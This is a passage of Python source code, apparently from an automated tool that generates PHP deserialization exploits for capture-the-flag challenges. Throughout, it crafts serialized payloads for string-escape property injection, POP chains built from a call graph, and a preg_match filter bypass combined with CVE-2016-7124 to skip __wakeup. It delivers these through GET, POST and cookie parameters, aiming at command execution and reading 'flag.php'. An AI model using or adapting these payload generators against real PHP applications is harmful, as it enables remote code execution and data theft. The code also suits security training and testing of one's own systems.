            replace_str = replace_parts[0]
            delta = len(replace_str) - len(search_str)

            if delta != 0:
                inputs = self._get_unserialize_inputs(analysis)
                for cls in analysis.classes:
                    if not cls.properties:
                        continue
                    target_val = self.SYSTEM_CAT_FLAG
                    target_prop = cls.properties[0]
                    for prop in cls.properties:
                        if prop.name.lower() in self.RCE_PROPERTY_NAMES:
                            target_prop = prop; target_val = self.SYSTEM_CAT_FLAG; break
                        elif prop.name.lower() in self.FILE_PROPERTY_NAMES:
                            target_prop = prop; target_val = 'flag.php'; break

                    prop_key = self._get_property_key(target_prop)
                    # Build base serialized with placeholder "X"
                    props_base = {}
                    for p in cls.properties:
                        pk = self._get_property_key(p)
                        props_base[pk] = "X" if p == target_prop else (p.default_value or "")
                    base_ser = php_serialize(php_object(cls.name, **props_base))
                    # Inflate property count to accommodate the injected second property
                    base_ser = base_ser.replace(f'"{cls.name}":1:', f'"{cls.name}":2:')

                    # For increase escape: L must be n*len(replace_str) (expanded)
                    # because str_replace runs BEFORE unserialize
                    injected_suffix = '";' + f'{prop_key}";s:{len(target_val)}:"{target_val}";' + '}'
                    n = max(1, len(injected_suffix) // delta + 1)
                    padding = search_str * n
                    full_val = padding + injected_suffix
                    declared_len = n * len(replace_str)

                    crafted = base_ser.replace(
                        f'{prop_key}";s:1:"X";}}',
                        f'{prop_key}";s:{declared_len}:"{full_val}";}}'
                    )

                    for inp in inputs:
                        p = Payload(
                            http_method=inp.method,
                            description=f"StrEscape {delta:+d}: '{search_str}'x{n} inject RCE",
                            serialized_string=crafted, strategy="string_escape",
                        )
                        if inp.method == 'GET': p.params = {inp.name: crafted}
                        elif inp.method == 'COOKIE': p.cookies = {inp.name: crafted}
                        else: p.data = {inp.name: crafted}
                        payloads.append(p)

        # Level 5 pattern: multiple serialized parameters (6 inputs: o,s,a,i,b,n)
        if len([i for i in analysis.inputs if i.method == 'POST']) >= 4:
            payloads.append(self._gen_level5_payload(analysis))

        return payloads

    def _gen_level5_payload(self, analysis: AnalysisResult) -> Payload:
        """Generate Level 5 specific payload with all required serialized values."""
        return Payload(
            http_method="POST",
            data={
                'o': php_serialize(php_object('a_class', a_value='FLAG')),
                's': php_serialize("IWANT"),
                'a': php_serialize({'a': 'Plz', 'b': 'Give_M3'}),
                'i': php_serialize(1),
                'b': php_serialize(True),
                'n': php_serialize(None),
            },
            description="Level 5: all serialized types matching conditions",
            strategy="unserialize_injection",
        )

    # ─── Helpers ───

    def _parse_conditions(self, analysis: AnalysisResult) -> dict:
        """Parse if($this->prop=='value') conditions to extract target values.
        Returns dict of {property_name: target_value}.
        Handles multi-condition patterns with &&, and, || operators."""
        conditions = {}
        source = analysis.raw_source

        # Pattern 1: $this->prop == "value" or $this->prop == 'value'
        for m in re.finditer(
            r'\$this->(\w+)\s*[!=]=\s*["\']([^"\']+)["\']',
            source
        ):
            prop_name = m.group(1)
            target_val = m.group(2)
            # Convert boolean strings
            if target_val.lower() == 'true': target_val = True
            elif target_val.lower() == 'false': target_val = False
            elif target_val.lower() == 'null': target_val = None
            conditions[prop_name] = target_val

        # Pattern 2: $obj->prop == "value" (for already-instantiated objects)
        for m in re.finditer(
            r'\$(\w+)->(\w+)\s*==\s*["\']([^"\']+)["\']',
            source
        ):
            prop_name = m.group(2)
            target_val = m.group(3)
            if prop_name not in conditions:
                if target_val.lower() == 'true': target_val = True
                elif target_val.lower() == 'false': target_val = False
                elif target_val.lower() == 'null': target_val = None
                conditions[prop_name] = target_val

        # Pattern 3: Multi-condition with and/&& — extract all
        for m in re.finditer(
            r'\$this->(\w+)\s*==\s*(\w+)\s*(?:&&|and)\s*\$this->(\w+)\s*==\s*(\w+)',
            source
        ):
            conditions[m.group(1)] = self._convert_php_value(m.group(2))
            conditions[m.group(3)] = self._convert_php_value(m.group(4))

        return conditions

    def _convert_php_value(self, val: str):
        """Convert PHP literal to Python type."""
        v = val.strip().strip('"').strip("'")
        if v.lower() == 'true': return True
        if v.lower() == 'false': return False
        if v.lower() == 'null': return None
        try: return int(v)
        except ValueError: pass
        return v

    def _get_unserialize_inputs(self, analysis: AnalysisResult):
        """Get inputs used for unserialize, or fallback to common names.
        Returns list of input-like objects with .name and .method attributes."""
        # Prefer inputs actually used in unserialize
        inputs = [i for i in analysis.inputs if i.used_in_unserialize]
        if inputs:
            return inputs
        # Then any GET/POST input (GET is very common in CTF challenges)
        inputs = [i for i in analysis.inputs if i.method in ('GET', 'POST')]
        if inputs:
            return inputs
        # Then COOKIE inputs
        inputs = [i for i in analysis.inputs if i.method == 'COOKIE']
        if inputs:
            return inputs
        # Fallback: common parameter names for POST and GET
        return [
            type('Input', (), {'name': 'o',   'method': 'POST'})(),
            type('Input', (), {'name': 'param','method': 'GET'})(),
            type('Input', (), {'name': 'flag', 'method': 'GET'})(),
            type('Input', (), {'name': 'data', 'method': 'POST'})(),
        ]

    def _get_property_key(self, prop: Property) -> str:
        """Get the proper serialization key for a property based on its visibility."""
        if prop.visibility == 'protected':
            return make_protected_key(prop.name)
        elif prop.visibility == 'private':
            return make_private_key(prop.class_name, prop.name)
        else:
            return prop.name

    def _build_call_graph(self, analysis: AnalysisResult) -> dict:
        """Build a call graph from method bodies.
        Returns dict of {caller_class: {callee_class: method_name}}.
        """
        edges = {}
        for cls in analysis.classes:
            for method in cls.methods:
                body = method.body
                # Pattern: $this->prop->method()
                for match in re.finditer(r'\$this->(\w+)\s*->\s*(\w+)\s*\(', body):
                    prop_name = match.group(1)
                    called_method = match.group(2)
                    # Find which class type this property likely holds
                    for prop in cls.properties:
                        if prop.name == prop_name:
                            edges[cls.name] = edges.get(cls.name, {})
                            # Try to determine target class
                            edges[cls.name][called_method] = prop_name

                # Pattern: echo $this->prop (triggers __toString)
                for match in re.finditer(r'echo\s+\$this->(\w+)', body):
                    prop_name = match.group(1)
                    edges[cls.name] = edges.get(cls.name, {})
                    edges[cls.name]['__toString'] = prop_name

                # Pattern: ($this->prop)() — triggers __invoke
                for match in re.finditer(r'\(\s*\$this->(\w+)\s*\)\s*\(', body):
                    prop_name = match.group(1)
                    edges[cls.name] = edges.get(cls.name, {})
                    edges[cls.name]['__invoke'] = prop_name

        return edges

    def _find_chain(self, edges: dict, entry: str, sink: str, max_depth: int = 5) -> list:
        """Find a chain from entry class to sink class."""
        visited = set()

        def dfs(current, path):
            if current == sink:
                return path + [current]
            if len(path) >= max_depth:
                return None
            visited.add(current)

            if current in edges:
                for method, prop in edges[current].items():
                    # Try to find target class from property name hints
                    next_class = None
                    # Common naming patterns
                    for cls_name in edges.keys():
                        if cls_name.lower() in prop.lower() or prop.lower() in cls_name.lower():
                            next_class = cls_name
                            break

                    if next_class and next_class not in visited:
                        result = dfs(next_class, path + [current])
                        if result:
                            return result

            return None

        return dfs(entry, [])

    def _find_chain_reverse(self, edges: dict, entries: list, sinks: list) -> list:
        """Try to find any chain from any entry to any sink."""
        for entry in entries:
            for sink in sinks:
                chain = self._find_chain(edges, entry, sink)
                if chain:
                    return chain
        return []

    def _build_chain_serialized(self, analysis: AnalysisResult, chain: list) -> Optional[str]:
        """Build serialized payload for a POP chain."""
        if not chain or len(chain) < 2:
            return None

        class_map = {c.name: c for c in analysis.classes}
        obj = None

        # Build from sink back to entry
        for class_name in reversed(chain):
            cls = class_map.get(class_name)
            if not cls:
                continue

            props = {}
            for prop in cls.properties:
                key = self._get_property_key(prop)
                if obj is not None and prop.name in ('cmd', 'a', 'b', 'c', 'd', 'name'):
                    props[key] = obj
                else:
                    props[key] = prop.default_value if prop.default_value is not None else ""
            obj = php_object(class_name, **props)

        if obj:
            return php_serialize(obj)
        return None

    def _gen_pregmatch_bypass(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate payloads that bypass preg_match('/[oc]:\\d+:/i') filters.
        Uses O:+N: format (plus sign bypasses digit check)."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)

        for cls in analysis.classes:
            props = {}
            for prop in cls.properties:
                key = self._get_property_key(prop)
                dv = prop.default_value
                if prop.name.lower() in self.RCE_PROPERTY_NAMES:
                    props[key] = self.SYSTEM_CAT_FLAG
                elif prop.name.lower() in self.FILE_PROPERTY_NAMES:
                    props[key] = 'flag.php'
                elif prop.name.lower() in self.AUTH_PROPERTY_NAMES:
                    props[key] = dv if dv is not None else 'admin'
                elif 'flag' in prop.name.lower():
                    props[key] = 'flag.php'
                else:
                    props[key] = dv if dv is not None else ''

            if not props:
                continue

            obj = php_object(cls.name, **props)
            serialized = php_serialize(obj)

            # Apply CVE-2016-7124: inflate count to skip __wakeup
            inflated = re.sub(
                rf'O:{len(cls.name)}:"{cls.name}":(\d+):',
                rf'O:{len(cls.name)}:"{cls.name}":{len(props) + 1}:',
                serialized
            )
            # Apply preg_match bypass: O:+N: format
            bypassed = inflated.replace(
                f'O:{len(cls.name)}:',
                f'O:+{len(cls.name)}:'
            )

            for inp in unserialize_inputs:
                p = Payload(
                    http_method=inp.method,
                    description=f"preg_match bypass + CVE-2016-7124 for {cls.name}",
                    serialized_string=bypassed,
                    strategy="wakeup_bypass",
                )
                if inp.method == 'GET':
                    p.params = {inp.name: bypassed}
                elif inp.method == 'COOKIE':
                    p.cookies = {inp.name: bypassed}
                else:
                    p.data = {inp.name: bypassed}
                payloads.append(p)

        return payloads
